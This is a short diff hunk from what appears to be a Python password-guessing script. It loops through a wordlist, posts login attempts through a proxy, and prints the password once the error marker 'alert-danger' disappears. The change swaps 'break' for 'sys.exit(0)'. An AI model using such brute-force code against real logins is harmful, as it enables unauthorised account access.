@@ -20,7 +20,7 @@ for line in file:
     response=requests.post(url,data=data,cookies=cookie,allow_redirects=False,proxies=proxy,headers=headers)
     if 'alert-danger' not in response.text:
          print("Password = "+word)
-         break
+         sys.exit(0)
     
 
 
